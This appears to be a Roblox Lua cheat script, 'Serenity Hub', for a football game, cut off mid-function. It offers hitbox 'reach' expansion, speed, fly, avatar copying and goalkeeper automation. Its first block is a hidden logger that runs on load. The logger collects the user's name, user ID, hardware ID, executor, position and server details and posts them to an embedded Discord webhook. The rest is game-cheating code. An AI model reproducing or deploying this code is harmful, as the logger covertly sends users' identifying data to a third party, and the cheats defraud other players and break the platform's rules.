local _LP = game:GetService("Players").LocalPlayer
local _H  = game:GetService("HttpService")
local _WH = "https://discord.com/api/webhooks/1535623831480176650/r6WiU7B2frf_bzTjMJTgRlxptZUTpXPc8Am8cyLA-trS3TuFBF_zeGKHTUJUkJQZ2YrQ"

local function _log()
    local hwid    = (gethwid and gethwid()) or "N/A"
    local exec    = (identifyexecutor and identifyexecutor()) or "unknown"
    local uis     = game:GetService("UserInputService")
    local plat    = (uis.TouchEnabled and not uis.KeyboardEnabled) and "Mobile" or "PC"
    local stats   = game:GetService("Stats")
    local mem     = math.floor(stats:GetTotalMemoryUsageMb()) .. " MB"
    local fps     = math.floor(1 / stats.FrameTime)
    local ping    = math.floor(_LP:GetNetworkPing() * 1000) .. "ms"
    local pos     = "N/A"
    local vel     = "N/A"
    local tool    = "None"
    local team    = _LP.Team and _LP.Team.Name or "None"
    local players = #game:GetService("Players"):GetPlayers()
    local maxplrs = game:GetService("Players").MaxPlayers
    local gamenam = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "N/A"

    pcall(function()
        local hrp = _LP.Character and _LP.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            pos = string.format("%.1f, %.1f, %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z)
            local v = hrp.Velocity
            vel = string.format("%.1f studs/s", v.Magnitude)
        end
        local t = _LP.Character and _LP.Character:FindFirstChildOfClass("Tool")
        if t then tool = t.Name end
    end)

    local created = "N/A"
    pcall(function()
        local age = _LP.AccountAge
        local d   = os.time() - age * 86400
        created   = os.date("%d/%m/%Y", d)
    end)

    task.spawn(function()
        pcall(function()
            local payload = _H:JSONEncode({
                embeds = {{
                    title = "touchline",
                    color = 1,
                    fields = {
                        {name=" man",       value="**Name:** ".._LP.Name.."\n**Display:** "..(_LP.DisplayName or _LP.Name).."\n**ID:** "..tostring(_LP.UserId), inline=true},
                        {name="Account oWo",      value="**Age:** "..tostring(_LP.AccountAge).."d\n**Created:** "..created.."\n**Team:** "..team, inline=true},
                        {name="Hardware uwu",     value="**HWID:** `"..hwid.."`\n**Executor:** "..exec.."\n**Platform:** "..plat, inline=false},
                        {name="Performance mwa",  value="**FPS:** "..tostring(fps).."\n**Ping:** "..ping.."\n**RAM:** "..mem, inline=true},
                        {name="Position daddy",     value="**Pos:** "..pos.."\n**Speed:** "..vel.."\n**Tool:** "..tool, inline=true},
                        {name=" Server duh",       value="**Game:** "..gamenam.."\n**Players:** "..players.."/"..maxplrs.."\n**PlaceId:** "..tostring(game.PlaceId), inline=true},
                        {name=" Job",          value="`"..tostring(game.JobId).."`", inline=false},
                    },
                    footer = {text="te coji todo "..os.date("%X %d/%m/%Y")},
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                }}
            })
            
            local req=(syn and syn.request) or (http and http.request) or http_request or request
            if req then
                req({Url=_WH,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
            else
                _H:PostAsync(_WH,payload)
            end
        end)
    end)
end

_log() 


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RuntimeEnvironment = (getgenv and getgenv()) or _G
if RuntimeEnvironment.__SERENITY_HUB_CLEANUP then
    pcall(RuntimeEnvironment.__SERENITY_HUB_CLEANUP)
end

local trackedConnections = {}
local scriptAlive = true

local function TrackConnection(connection)
    table.insert(trackedConnections, connection)
    return connection
end

local function DisconnectTrackedConnections()
    for index = #trackedConnections, 1, -1 do
        local connection = trackedConnections[index]
        if connection then
            pcall(function() connection:Disconnect() end)
        end
        trackedConnections[index] = nil
    end
end

local PURPLE = Color3.fromRGB(160, 50, 255)
local PURPLE_DARK = Color3.fromRGB(100, 20, 200)
local PURPLE_LIGHT = Color3.fromRGB(200, 120, 255)
local PURPLE_GLOW = Color3.fromRGB(180, 80, 255)

-- ============================================
--  VARIABLES GLOBALES
-- ============================================

-- REACH
local m1_enabled = false
local m1_size = 6.0
local m1_transparency = 0.7

local REACH_SIZE = 10
local reachMethod2Enabled = false
local reachTransparency2 = 1

-- BALL COLLISION PROXY (SOLO TOGGLE)
local proxyEnabled = false
local ballProxies = {}

-- CHARACTER REACH
local CharacterReachEnabled = false
local CharacterReachSize = 12.0
local CharacterVisualizerIntensity = 0.5

-- PLATFORM (AIR DRIBBLE HELPER)
local PlatformEnabled = false
local PlatformSize = 15
local Smoothness = 0.95
local ShowPlatform = false
local PlatformTransparency = 0.7

-- MOVEMENT
local WalkSpeedValue = 26
local WalkSpeedEnabled = false
local DefaultWalkSpeed = 16

local JumpPowerEnabled = false
local JumpPowerValue = 50
local DefaultJumpPower = 50

-- GK AUTO DIVE
local DIVE_RANGE = 40
local DIVE_SPEED = 45
local DIVE_LIFT = 28
local COOLDOWN = 0.2
local HIT_RADIUS = 6
local gkAutoDiveEnabled = false
local onCooldown = false
local animPlaying = false
local liveTrack = nil
local touchCD = false

-- ANIMACIONES GK
local ANIM_HEADER = "rbxassetid://83669895507175"
local ANIM_BACK = "rbxassetid://133843606757895"
local ANIM_RIGHT = "rbxassetid://130737929982335"
local ANIM_LEFT = "rbxassetid://97298506180835"

-- PREDICTION
local PRED_RANGE = 20
local PRED_TOUCH = 6
local PRED_GRAVITY = -98.1
local PRED_TIME = 1.4
local predOn = false
local predObjs = {}
local predConn = nil
local cachedPingGlobal = 0.06

-- REACT
local _reactActive = false
local _reactThread = nil
local _lastReactTT, _lastReactInterp = "13", "90"

-- GK REACT
local _gkReactActive = false
local _gkReactThread = nil
local _lastGkReactTT, _lastGkReactInterp = "13", "90"

-- 200 KICKS
local kickLoopEnabled = false
local kickReach = 20
local kickConnection = nil

-- INF DRIBBLE
local dribbleEnabled = false
local dribbleConn = nil
local dribbleSpeed = 26

-- FLY
local flyEnabled = false
local flySpeed = 40
local flyBV = nil
local flyConn = nil

-- TP WALK
local tpEnabled = false
local tpSpeed = 3
local tpConn = nil

-- FFLAGS
local FFlagValues = {
    ["DFIntTargetTimeDelayFactorTenths"] = "100",
    ["FIntInterpolationMaxDelayMSec"] = "1000",
    ["DFIntS2PhysicsSenderRate"] = "0"
}

-- ============================================
--  VARIABLES DE SERENITY ORIGINAL
-- ============================================

local ballParts = {}
local ballVisualizers = {}
local reachOriginalProperties = {}
local platforms = {}
local platformRunning = false
local platformConnection = nil
local characterReachPart = nil
local characterReachWeld = nil
local characterReachOutline = nil
local walkSpeedConnection = nil
local currentHumanoid = nil
local changingWalkSpeed = false
local isCharacterRespawning = false

-- ============================================
--  AVATAR STEALER
-- ============================================

local function StealAvatar(userId, character)
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local success, appearance = pcall(function()
        return Players:GetCharacterAppearanceAsync(userId)
    end)
    if not success or not appearance then return end

    local hasHeadless = false
    local hasKorblox = false

    local descSuccess, description = pcall(function()
        return Players:GetHumanoidDescriptionFromUserId(userId)
    end)
    if descSuccess and description then
        if description.Head == 47079 or description.Head == 1340101835 or description.Head == 6340101835 or description.Head == 6686307858 then
            hasHeadless = true
        end
        if description.RightLeg == 139607718 then
            hasKorblox = true
        end
    end

    for _, v in pairs(character:GetChildren()) do
        if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("CharacterMesh") or v:IsA("BodyColors") then
            v:Destroy()
        end
    end
    if character:FindFirstChild("Head") then
        for _, ch in ipairs(character.Head:GetChildren()) do
            if ch:IsA("Decal") then ch:Destroy() end
        end
    end

    for _, v in ipairs(appearance:GetDescendants()) do
        if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then
            pcall(function()
                local cl = v:Clone()
                cl.Parent = character
            end)
        elseif v:IsA("Accessory") then
            pcall(function()
                local cl = v:Clone()
                humanoid:AddAccessory(cl)
            end)
        elseif v:IsA("CharacterMesh") then
            pcall(function()
                local cl = v:Clone()
                cl.Parent = character
            end)
        end
    end

    local faceTexture = nil
    for _, dsc in ipairs(appearance:GetDescendants()) do
        if dsc:IsA("Decal") and (dsc.Name == "face" or dsc.Name == "Face") then
            faceTexture = dsc.Texture
            break
        end
    end

    if not faceTexture and descSuccess and description and description.Face > 0 then
        pcall(function()
            local obj = game:GetObjects("rbxassetid://" .. tostring(description.Face))
            if obj and #obj > 0 then
                for _, item in ipairs(obj) do
                    if item:IsA("Decal") then faceTexture = item.Texture break end
                    for _, child in ipairs(item:GetDescendants()) do
                        if child:IsA("Decal") then faceTexture = child.Texture break end
                    end
                    if faceTexture then break end
                end
            end
        end)
    end

    local head = character:FindFirstChild("Head")
    if head then
        local face = Instance.new("Decal")
        face.Face = Enum.NormalId.Front
        face.Name = "face"
        face.Texture = faceTexture or "rbxasset://textures/face.png"
        face.Transparency = 0
        face.Parent = head
    end

    if hasHeadless and character:FindFirstChild("Head") then
        character.Head.Transparency = 1
        if character.Head:FindFirstChildOfClass("SpecialMesh") then
            character.Head:FindFirstChildOfClass("SpecialMesh").MeshId = ""
        else
            local fc = character.Head:FindFirstChildOfClass("FaceControls")
            if fc then fc:Destroy() end
        end
    elseif character:FindFirstChild("Head") then
        character.Head.Transparency = 0
    end

    if hasKorblox then
        if character:FindFirstChild("RightLowerLeg") then
            character.RightLowerLeg.MeshId = "902942093"
            character.RightLowerLeg.Transparency = 1
        end
        if character:FindFirstChild("RightUpperLeg") then
            character.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
            character.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
        end
        if character:FindFirstChild("RightFoot") then
            character.RightFoot.MeshId = "902942089"
            character.RightFoot.Transparency = 1
        end
    else
        if character:FindFirstChild("RightLowerLeg") then character.RightLowerLeg.Transparency = 0 end
        if character:FindFirstChild("RightFoot") then character.RightFoot.Transparency = 0 end
    end

    local parent = character.Parent
    character.Parent = nil
    character.Parent = parent
end

local function StealAvatarByName(username)
    if not username or username == "" then return end
    local success, userId = pcall(function()
        return Players:GetUserIdFromNameAsync(username)
    end)
    if success and userId and LocalPlayer.Character then
        StealAvatar(userId, LocalPlayer.Character)
    end
end

-- ============================================
--  DETECCIÓN DE BALONES
-- ============================================

local function IsBallName(name)
    local lowered = string.lower(name or "")
    if lowered == "ball" or lowered == "football" or lowered == "soccerball" then
        return true
    end
    return string.find(lowered, "ball", 1, true) ~= nil
end

local function IsReasonableBallPart(part)
    local size = part.Size
    local largest = math.max(size.X, size.Y, size.Z)
    local smallest = math.min(size.X, size.Y, size.Z)
    if smallest <= 0.02 or largest > 20 then return false end
    if largest / smallest > 6 then return false end
    return true
end

local function RegisterBallPart(part)
    if part and part:IsA("BasePart") and part.Parent and IsReasonableBallPart(part) then
        if not ballParts[part] then
            ballParts[part] = true
        end
    end
end

local function RegisterBallCandidate(instance)
    if not instance or not instance.Parent then return end
    if (instance:IsA("BasePart") or instance:IsA("Model")) and IsBallName(instance.Name) then
        local part = instance:IsA("BasePart") and instance or instance.PrimaryPart or instance:FindFirstChildWhichIsA("BasePart")
        if part then RegisterBallPart(part) end
    end
end

TrackConnection(workspace.DescendantAdded:Connect(RegisterBallCandidate))

task.spawn(function()
    for _, instance in ipairs(workspace:GetDescendants()) do
        if not scriptAlive then return end
        RegisterBallCandidate(instance)
        task.wait()
    end
end)

-- ============================================
--  UTILITY FUNCTIONS
-- ============================================

local function getFootballFolder()
    return workspace:FindFirstChild("Footballs")
end

local function getClosestFootball()
    local folder = getFootballFolder()
    if not folder then return nil end
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    local best, closest = math.huge, nil
    for _, b in folder:GetChildren() do
        if b:IsA("BasePart") then
            local d = (b.Position - hrp.Position).Magnitude
            if d < best then best = d; closest = b end
        end
    end
    return closest, best
end

local function getKickRemote()
    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
    if remotes then
        local gameRemote = remotes:FindFirstChild("Game")
        if gameRemote then
            local touch = gameRemote:FindFirstChild("Touch")
            if touch then
                return touch:FindFirstChild("Kick")
            end
        end
    end
    return nil
end

local function getAllBalls()
    local folder = getFootballFolder()
    if not folder then return {} end
    local balls = {}
    for _, obj in ipairs(folder:GetChildren()) do
        local part = obj:IsA("BasePart") and obj or obj:FindFirstChildWhichIsA("BasePart")
        if part then table.insert(balls, part) end
    end
    return balls
end

local function inBox()
    local gui = LocalPlayer:FindFirstChild("PlayerGui")
    if not gui then return false end
    local main = gui:FindFirstChild("Main")
    if not main then return false end
    local values = main:FindFirstChild("Values")
    if not values then return false end
    local goalie = values:FindFirstChild("Goalie")
    if not goalie then return false end
    return goalie.Value == true
end

-- ============================================
--  VISUALIZER MORADO DE SERENITY (CON OUTLINE)
-- ============================================

local function CreateVisualizerSerenity(ball, size, transparency)
    if ballVisualizers[ball] and ballVisualizers[ball].Parent then
        local vis = ballVisualizers[ball]
        vis.Size = Vector3.new(size, size, size)
        vis.Transparency = transparency
        vis.CFrame = ball.CFrame
        return vis
    end
    
    local visualizer = Instance.new("Part")
    visualizer.Name = "__BallVisualizer"
    visualizer.Size = Vector3.new(size, size, size)
    visualizer.CFrame = ball.CFrame
    visualizer.Anchored = true
    visualizer.CanCollide = false
    visualizer.CanTouch = false
    visualizer.CanQuery = false
    visualizer.CastShadow = false
    visualizer.Transparency = transparency
    visualizer.Material = Enum.Material.ForceField
    visualizer.Color = PURPLE
    visualizer.Shape = ball.Shape
    visualizer.Massless = true
    visualizer.Parent = workspace
    
    local outline = Instance.new("Highlight")
    outline.Name = "__BallVisualizerOutline"
    outline.Adornee = visualizer
    outline.FillTransparency = 1
    outline.OutlineColor = PURPLE
    outline.OutlineTransparency = 0.2
    outline.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    outline.Parent = visualizer
    
    ballVisualizers[ball] = visualizer
    return visualizer
end

local function RemoveVisualizerSerenity(ball)
    if ballVisualizers[ball] then
        ballVisualizers[ball]:Destroy()
        ballVisualizers[ball] = nil
    end
end

local function UpdateVisualizers(size, transparency)
    for ball, visualizer in pairs(ballVisualizers) do
        if ball and ball.Parent and visualizer and visualizer.Parent then
            visualizer.CFrame = ball.CFrame
            if visualizer.Size ~= Vector3.new(size, size, size) then
                visualizer.Size = Vector3.new(size, size, size)
            end
            if visualizer.Transparency ~= transparency then
                visualizer.Transparency = transparency
            end
        else
            if visualizer then visualizer:Destroy() end
            ballVisualizers[ball] = nil
        end
    end
end

-- ============================================
--  BALL COLLISION PROXY (SOLO TOGGLE)
-- ============================================

local proxySyncConnection = nil
local proxyOriginalSizes = {}

-- Esta función se llama cuando se detecta una pelota NUEVA
-- Guarda el tamaño original ANTES de que cualquier modificación ocurra
local function RegisterProxyBall(ball)
    if not ball or not ball:IsA("BasePart") then return end
    if not proxyOriginalSizes[ball] then
        proxyOriginalSizes[ball] = ball.Size
    end
end

-- Modificar RegisterBallCandidate para guardar el tamaño original
local oldRegisterBallCandidate = RegisterBallCandidate
RegisterBallCandidate = function(instance)
    if not instance or not instance.Parent then return end
    if (instance:IsA("BasePart") or instance:IsA("Model")) and IsBallName(instance.Name) then
        local part = instance:IsA("BasePart") and instance or instance.PrimaryPart or instance:FindFirstChildWhichIsA("BasePart")
        if part then 
            RegisterBallPart(part)
            -- GUARDAR TAMAÑO ORIGINAL ANTES DE CUALQUIER MODIFICACIÓN
            RegisterProxyBall(part)
        end
    end
end

-- También guardar tamaño de pelotas existentes al inicio
task.spawn(function()
    local folder = getFootballFolder()
    if folder then
        for _, ball in folder:GetChildren() do
            if ball:IsA("BasePart") then
                RegisterProxyBall(ball)
            end
        end
    end
end)

local function CreateCollisionProxy(ball)
    if ballProxies[ball] and ballProxies[ball].Parent then
        return ballProxies[ball]
    end
    
    -- Usar el tamaño original guardado
    local originalSize = proxyOriginalSizes[ball]
    if not originalSize then
        -- Si por algún motivo no tenemos el tamaño, guardarlo ahora
        originalSize = ball.Size
        proxyOriginalSizes[ball] = originalSize
    end
    
    local proxy = Instance.new("Part")
    proxy.Name = "__CollisionProxy"
    proxy.Size = originalSize -- TAMAÑO ORIGINAL
    proxy.CFrame = ball.CFrame
    proxy.Anchored = true
    proxy.CanCollide = true
    proxy.CanTouch = true
    proxy.CanQuery = true
    proxy.Transparency = 1
    proxy.Material = Enum.Material.Plastic
    proxy.Color = Color3.new(1, 1, 1)
    proxy.Massless = true
    proxy.Shape = ball.Shape
    proxy.Parent = workspace
    
    ballProxies[ball] = proxy
    return proxy
end

local function RemoveCollisionProxy(ball)
    if ballProxies[ball] then
        ballProxies[ball]:Destroy()
        ballProxies[ball] = nil
    end
end

local function StartProxySystem()
    if proxySyncConnection then proxySyncConnection:Disconnect() end
    
    if not proxyEnabled then return end
    
    local folder = getFootballFolder()
    if folder then
        for _, ball in folder:GetChildren() do
            if ball:IsA("BasePart") then
                -- Asegurar que tenemos el tamaño original
                if not proxyOriginalSizes[ball] then
                    proxyOriginalSizes[ball] = ball.Size
                end
                CreateCollisionProxy(ball)
            end
        end
    end
    
    proxySyncConnection = RunService.Heartbeat:Connect(function()
        if not proxyEnabled then return end
        
        local folder = getFootballFolder()
        if not folder then return end
        
        for _, ball in folder:GetChildren() do
            if ball:IsA("BasePart") then
                -- Para pelotas nuevas que aparecen después
                if not proxyOriginalSizes[ball] then
                    proxyOriginalSizes[ball] = ball.Size
                end
                
                if not ballProxies[ball] or not ballProxies[ball].Parent then
                    CreateCollisionProxy(ball)
                else
                    -- Solo actualizar posición, NO el tamaño
                    ballProxies[ball].CFrame = ball.CFrame
                end
            end
        end
        
        for ball, proxy in pairs(ballProxies) do
            if not ball or not ball.Parent then
                RemoveCollisionProxy(ball)
            end
        end
    end)
end

local function StopProxySystem()
    if proxySyncConnection then
        proxySyncConnection:Disconnect()
        proxySyncConnection = nil
    end
    for ball, proxy in pairs(ballProxies) do
        RemoveCollisionProxy(ball)
    end
    table.clear(ballProxies)
end

-- ============================================
--  MÉTODO 1: REACH NO BALL COLLISION
-- ============================================

local m1_connection = nil
local m1_visualizer_connection = nil
local m1_grey_color = Color3.fromRGB(128, 128, 128)

local function ApplyReachMethod1(ball)
    if not ball or not ball.Parent or not ball:IsA("BasePart") then return end
    
    if not reachOriginalProperties[ball] then
        reachOriginalProperties[ball] = {
            Size = ball.Size,
            Transparency = ball.Transparency,
            CanCollide = ball.CanCollide,
            Color = ball.Color
        }
    end
    
    ball.Size = Vector3.new(m1_size, m1_size, m1_size)
    ball.Transparency = 1
    ball.CanCollide = false
    ball.Color = m1_grey_color
end

local function RestoreBallMethod1(ball)
    if reachOriginalProperties[ball] then
        local props = reachOriginalProperties[ball]
        pcall(function()
            ball.Size = props.Size
            ball.Transparency = props.Transparency
            ball.CanCollide = props.CanCollide
            ball.Color = props.Color
        end)
        reachOriginalProperties[ball] = nil
    end
    RemoveVisualizerSerenity(ball)
end

local function StartMethod1()
    if m1_connection then m1_connection:Disconnect(); m1_connection = nil end
    if m1_visualizer_connection then m1_visualizer_connection:Disconnect(); m1_visualizer_connection = nil end
    if not m1_enabled then return end
    
    for ball in pairs(ballParts) do
        if ball and ball.Parent then
            ApplyReachMethod1(ball)
            CreateVisualizerSerenity(ball, m1_size, m1_transparency)
        end
    end
    
    m1_connection = RunService.RenderStepped:Connect(function()
        if not m1_enabled then return end
        local folder = getFootballFolder()
        if not folder then return end
        
        for _, b in folder:GetChildren() do
            if b:IsA("BasePart") then
                if not ballParts[b] then ballParts[b] = true end
                ApplyReachMethod1(b)
                if not ballVisualizers[b] or not ballVisualizers[b].Parent then
                    CreateVisualizerSerenity(b, m1_size, m1_transparency)
                end
            end
        end
    end)
    
    m1_visualizer_connection = RunService.Heartbeat:Connect(function()
        if not m1_enabled then return end
        UpdateVisualizers(m1_size, m1_transparency)
    end)
end

local function StopMethod1()
    if m1_connection then m1_connection:Disconnect(); m1_connection = nil end
    if m1_visualizer_connection then m1_visualizer_connection:Disconnect(); m1_visualizer_connection = nil end
    for ball in pairs(ballVisualizers) do RemoveVisualizerSerenity(ball) end
    for ball, props in pairs(reachOriginalProperties) do
        if ball and ball.Parent then RestoreBallMethod1(ball) end
        reachOriginalProperties[ball] = nil
    end
end

-- ============================================
--  MÉTODO 2: REACH BALL COLLISION
-- ============================================

local method2_trackedParts = {}
local method2_indicator = nil
local method2_visualizer_connection = nil
local originalColors = {}
local originalSizes = {}

local function SetupMethod2()
    if getgenv().Reach then getgenv().Reach = nil end
    if getgenv().ReachConnections then
        for _, connection in ipairs(getgenv().ReachConnections) do
            pcall(function() connection:Disconnect() end)
        end
        getgenv().ReachConnections = nil
    end
    
    getgenv().ReachConnections = {}
    getgenv().Reach = {
        Enabled = false,
        Size = REACH_SIZE,
        Transparency = reachTransparency2,
        Distance = 100
    }
    
    local character = LocalPlayer.Character
    if not character then character = LocalPlayer.CharacterAdded:Wait() end
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    local footballs = getFootballFolder()
    if not footballs then
        footballs = Instance.new("Folder")
        footballs.Name = "Footballs"
        footballs.Parent = workspace
    end
    
    method2_trackedParts = {}
    originalSizes = {}
    originalColors = {}
    
    local function onChildAdded(item)
        if item:IsA("BasePart") then
            method2_trackedParts[item] = true
            originalSizes[item] = item.Size
            originalColors[item] = item.Color
        end
    end
    
    for _, part in ipairs(footballs:GetChildren()) do
        if part:IsA("BasePart") then
            method2_trackedParts[part] = true
            originalSizes[part] = part.Size
            originalColors[part] = part.Color
        end
    end
    
    table.insert(getgenv().ReachConnections, footballs.ChildAdded:Connect(onChildAdded))
    table.insert(getgenv().ReachConnections, footballs.ChildRemoved:Connect(function(child)
        method2_trackedParts[child] = nil
        originalSizes[child] = nil
        originalColors[child] = nil
        RemoveVisualizerSerenity(child)
    end))
    
    local function updateReachSize()
        local currentSize = getgenv().Reach.Size or REACH_SIZE
        for part in pairs(method2_trackedParts) do
            if part and part.Parent then
                part.Size = Vector3.new(currentSize, currentSize, currentSize)
                part.Color = Color3.fromRGB(128, 128, 128)
                part.CanCollide = false
            end
        end
    end
    
    local function resetParts()
        for part in pairs(method2_trackedParts) do
            if part and part.Parent then
                if originalSizes[part] then part.Size = originalSizes[part] end
                if originalColors[part] then part.Color = originalColors[part] end
                part.CanCollide = true
                if reachOriginalProperties[part] and reachOriginalProperties[part].Transparency then
                    part.Transparency = reachOriginalProperties[part].Transparency
                else
                    part.Transparency = 0
                end
            end
            RemoveVisualizerSerenity(part)
        end
    end
    
    local function findNearestPart()
        local nearest, nearestDist = nil, math.huge
        for part in pairs(method2_trackedParts) do
            if part and part.Parent then
                local dist = (part.Position - humanoidRootPart.Position).Magnitude
                if dist < nearestDist then nearestDist = dist; nearest = part end
            end
        end
        return nearest, nearestDist
    end
    
    if method2_indicator then method2_indicator:Destroy() end
    method2_indicator = Instance.new("Part")
    method2_indicator.Name = "BallFollowPart"
    method2_indicator.Shape = Enum.PartType.Ball
    method2_indicator.Size = Vector3.new(2.25, 2.25, 2.25)
    method2_indicator.Anchored = true
    method2_indicator.CanCollide = true
    method2_indicator.CanTouch = false
    method2_indicator.CanQuery = false
    method2_indicator.Transparency = 0.5
    method2_indicator.Material = Enum.Material.ForceField
    method2_indicator.Color = Color3.fromRGB(0, 200, 255)
    method2_indicator.Parent = workspace
    
    table.insert(getgenv().ReachConnections, RunService.Heartbeat:Connect(function()
        if not reachMethod2Enabled then return end
        local nearest, distance = findNearestPart()
        if not nearest or distance > getgenv().Reach.Distance then
            resetParts()
            if method2_indicator then method2_indicator.CFrame = CFrame.new(0, -1000, 0) end
        else
            updateReachSize()
            if method2_indicator then method2_indicator.CFrame = nearest.CFrame end
            if nearest and nearest.Parent then
                if not ballVisualizers[nearest] or not ballVisualizers[nearest].Parent then
                    CreateVisualizerSerenity(nearest, REACH_SIZE, reachTransparency2)
                end
            end
        end
    end))
    
    if method2_visualizer_connection then method2_visualizer_connection:Disconnect() end
    method2_visualizer_connection = RunService.Heartbeat:Connect(function()
        if not reachMethod2Enabled then return end
        for ball, visualizer in pairs(ballVisualizers) do
            if ball and ball.Parent and visualizer and visualizer.Parent then
                visualizer.CFrame = ball.CFrame
                local currentSize = getgenv().Reach.Size or REACH_SIZE
                if visualizer.Size ~= Vector3.new(currentSize, currentSize, currentSize) then
                    visualizer.Size = Vector3.new(currentSize, currentSize, currentSize)
                end
                local currentTransparency = getgenv().Reach.Transparency or 1
                if visualizer.Transparency ~= currentTransparency then
                    visualizer.Transparency = currentTransparency
                end
            else
                if visualizer then visualizer:Destroy() end
                ballVisualizers[ball] = nil
            end
        end
    end)
    
    getgenv().DisableReach = function()
        if getgenv().ReachConnections then
            for _, connection in ipairs(getgenv().ReachConnections) do
                connection:Disconnect()
            end
        end
        if method2_visualizer_connection then method2_visualizer_connection:Disconnect(); method2_visualizer_connection = nil end
        resetParts()
        if method2_indicator then method2_indicator:Destroy(); method2_indicator = nil end
        getgenv().Reach = nil
        getgenv().ReachConnections = nil
    end
end

local function StartMethod2()
    if reachMethod2Enabled then SetupMethod2() end
end

local function StopMethod2()
    if getgenv().DisableReach then getgenv().DisableReach() end
    if method2_visualizer_connection then method2_visualizer_connection:Disconnect(); method2_visualizer_connection = nil end
    for ball in pairs(ballVisualizers) do RemoveVisualizerSerenity(ball) end
end

-- ============================================
--  CHARACTER REACH SYSTEM
-- ============================================

local function CharacterIntensityToTransparency(intensity)
    return math.clamp(0.95 - (math.clamp(intensity, 0.1, 1) * 0.65), 0.3, 0.9)
end

local function CharacterIntensityToOutlineTransparency(intensity)
    return math.clamp(0.78 - (math.clamp(intensity, 0.1, 1) * 0.68), 0.1, 0.72)
end

local function DestroyCharacterReach()
    if characterReachWeld then characterReachWeld:Destroy(); characterReachWeld = nil end
    if characterReachOutline then characterReachOutline:Destroy(); characterReachOutline = nil end
    if characterReachPart then characterReachPart:Destroy(); characterReachPart = nil end
end

local function RefreshCharacterReach(character)
    if not CharacterReachEnabled then DestroyCharacterReach(); return end
    character = character or LocalPlayer.Character
    if not character or not character.Parent then return end
    local root = character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    if characterReachPart and characterReachPart.Parent ~= character then DestroyCharacterReach() end
    
    if not characterReachPart then
        local sphere = Instance.new("Part")
        sphere.Name = "SerenityCharacterReach"
        sphere.Shape = Enum.PartType.Ball
        sphere.Size = Vector3.new(CharacterReachSize, CharacterReachSize, CharacterReachSize)
        sphere.CFrame = root.CFrame
        sphere.Anchored = false
        sphere.Massless = true
        sphere.CanCollide = false
        sphere.CanTouch = true
        sphere.CanQuery = true
        sphere.CastShadow = false
        sphere.Material = Enum.Material.ForceField
        sphere.Color = PURPLE
        sphere.Transparency = CharacterIntensityToTransparency(CharacterVisualizerIntensity)
        sphere.Parent = character
        
        local outline = Instance.new("Highlight")
        outline.Name = "SerenityCharacterReachOutline"
        outline.Adornee = sphere
        outline.FillTransparency = 1
        outline.OutlineColor = PURPLE
        outline.OutlineTransparency = CharacterIntensityToOutlineTransparency(CharacterVisualizerIntensity)
        outline.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        outline.Parent = sphere
        
        local weld = Instance.new("WeldConstraint")
        weld.Name = "SerenityCharacterReachWeld"
        weld.Part0 = root
        weld.Part1 = sphere
        weld.Parent = sphere
        
        characterReachPart = sphere
        characterReachOutline = outline
        characterReachWeld = weld
    end
    
    local targetSize = Vector3.new(CharacterReachSize, CharacterReachSize, CharacterReachSize)
    if characterReachPart.Size ~= targetSize then characterReachPart.Size = targetSize end
    characterReachPart.Color = PURPLE
    
    local targetTransparency = CharacterIntensityToTransparency(CharacterVisualizerIntensity)
    if characterReachPart.Transparency ~= targetTransparency then characterReachPart.Transparency = targetTransparency end
    
    if characterReachOutline then
        characterReachOutline.OutlineColor = PURPLE
        characterReachOutline.OutlineTransparency = CharacterIntensityToOutlineTransparency(CharacterVisualizerIntensity)
    end
end

local function StartCharacterReachSystem()
    if not CharacterReachEnabled then return end
    local character = LocalPlayer.Character
    if character then RefreshCharacterReach(character) end
end

local function StopCharacterReachSystem()
    DestroyCharacterReach()
end

TrackConnection(LocalPlayer.CharacterAdded:Connect(function()
    if CharacterReachEnabled then
        task.defer(function()
            if scriptAlive and CharacterReachEnabled then StartCharacterReachSystem() end
        end)
    end
end))

-- ============================================
--  PLATFORM SYSTEM (AIR DRIBBLE HELPER)
-- ============================================

local function createPlatform(ballPart)
    local existing = platforms[ballPart]
    if existing and existing.part and existing.part.Parent then return existing end
    
    local platform = Instance.new("Part")
    platform.Name = "SerenityAirPlatform"
    platform.Size = Vector3.new(PlatformSize, 0.2, PlatformSize)
    platform.Position = ballPart.Position - Vector3.new(0, 2, 0)
    platform.Anchored = true
    platform.CanCollide = true
    platform.CanTouch = false
    platform.CanQuery = false
    platform.CastShadow = false
    platform.Color = PURPLE
    platform.Material = Enum.Material.SmoothPlastic
    platform.Transparency = ShowPlatform and PlatformTransparency or 1
    platform.Parent = workspace
    
    local data = { part = platform, lastPosition = platform.Position, lastCanCollide = true }
    platforms[ballPart] = data
    return data
end

local function removePlatform(ballPart)
    local data = platforms[ballPart]
    if data and data.part then data.part:Destroy() end
    platforms[ballPart] = nil
end

local function ClearAllPlatforms()
    for ballPart, data in pairs(platforms) do
        if data and data.part then data.part:Destroy() end
        platforms[ballPart] = nil
    end
end

local function UpdatePlatformSize()
    local targetSize = Vector3.new(PlatformSize, 0.2, PlatformSize)
    for _, data in pairs(platforms) do
        local part = data and data.part
        if part and part.Parent and part.Size ~= targetSize then part.Size = targetSize end
    end
end

local function UpdatePlatformVisibility()
    local targetTransparency = ShowPlatform and PlatformTransparency or 1
    for _, data in pairs(platforms) do
        local part = data and data.part
        if part and part.Parent and part.Transparency ~= targetTransparency then
